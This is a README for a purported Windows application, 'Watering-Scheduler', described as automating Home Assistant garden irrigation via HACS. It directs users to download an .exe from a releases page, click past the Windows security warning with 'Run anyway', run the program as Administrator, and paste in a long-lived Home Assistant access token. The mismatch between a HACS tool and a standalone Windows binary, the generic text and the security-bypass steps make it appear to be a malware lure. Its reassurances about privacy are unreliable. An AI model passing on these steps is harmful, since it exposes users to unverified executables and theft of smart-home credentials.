# 💧 Watering-Scheduler - Automate your home garden irrigation cycles

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Basicre4782/Watering-Scheduler/releases)

## What this program does

Watering-Scheduler helps you manage your garden irrigation through Home Assistant. It removes the need for manual watering. You create custom schedules for your plants. The system turns your valves on and off based on these settings. It uses your existing HACS integration to talk to your smart home equipment. You save water and keep your plants healthy.

## Requirements

Your computer needs Windows 10 or Windows 11 to run this application. You must have Home Assistant running on your local network. You also need the HACS integration installed within Home Assistant. Ensure your computer stays connected to the same network as your Home Assistant server. You need a basic understanding of your home network settings.

## 📥 Getting the software

You need to download the current version of the application. 

1. Visit [this page to download](https://github.com/Basicre4782/Watering-Scheduler/releases).
2. Look for the file ending in .exe in the Assets section.
3. Click the file name to start the download.
4. Save the file to your desktop for easy access.

## ⚙️ Setting up the application

Follow these steps to prepare the software once the download finishes:

1. Double-click the file you downloaded.
2. Windows might show a security prompt. If Windows protects your PC, click "More info," then click "Run anyway."
3. The installer window appears on your screen. 
4. Follow the prompts to select your installation folder.
5. Click "Install" to copy the files to your computer.
6. The installer creates a shortcut on your desktop.

## 🔌 Connecting to Home Assistant

The application needs access to your Home Assistant server to work. You must provide the address of your server.

1. Open the Watering-Scheduler application using the desktop icon.
2. The settings window opens on first launch.
3. Enter your Home Assistant URL in the first box. This usually looks like http://homeassistant.local:8123.
4. You need an Access Token. Open Home Assistant in your web browser.
5. Go to your Profile settings.
6. Scroll down to Long-Lived Access Tokens.
7. Click "Create Token" and name it Watering-Scheduler.
8. Copy the long code string.
9. Paste this code into the Access Token box in the application.
10. Click the "Save and Test Connection" button.
11. A success message confirms the link between your computer and your garden system.

## 📅 Creating your first schedule

You define your watering patterns after the connection works.

1. Select the "Schedules" tab in the main window.
2. Click the "Add Schedule" button.
3. Type a name for your zone, such as "Front Lawn" or "Vegetable Garden."
4. Select the smart valve from the dropdown list. The application pulls this list from your HACS integration.
5. Pick the days of the week for watering.
6. Set the start time.
7. Choose the duration in minutes.
8. Click "Apply" to save your schedule.
9. Click "Sync" to send these instructions to your hardware.

## 🔍 Understanding your system features

The application includes features to help you manage water usage.

- **Manual Override:** You can start or stop any valve instantly. Click the "Manual" tab and toggle the switch for the specific zone. 
- **Weather Adjustment:** The system checks local weather data. If your area expects rain, the scheduler skips the next cycle. This prevents over-watering.
- **Watering History:** Open the "Logs" tab to see when the system last watered your plants. You can view data for the last thirty days.
- **Safety Limits:** You can set a maximum run time for each valve. This prevents flooding if a sensor fails. You change these settings in the Configuration menu.

## 🛠 Troubleshooting common issues

Most problems have simple solutions. Read this section if you encounter errors.

- **Connection Error:** Verify that your Home Assistant server is running. Check that your computer and Home Assistant are on the same network. Ensure you copied the full Access Token.
- **Valves do not trigger:** Check the HACS integration status in Home Assistant. Ensure the valve entities appear active. Check if the physical valves have power or batteries.
- **Schedules not saving:** Close the application and run it as an Administrator. Right-click the application icon and choose "Run as administrator." This gives the program permission to write settings files.
- **Update notifications:** Occasionally, a new version becomes available. The status bar at the bottom of the window shows an update alert. Follow the link to download the new version. Your settings remain saved during the update.

## 🛡 Security and privacy

This application runs locally on your machine. We do not track your data. Your Access Token stays on your computer and is only used to send commands to your Home Assistant server. You hold full control over the information because the software does not send data to external cloud services. You should keep your Access Token private and secure. Do not share your token with other people.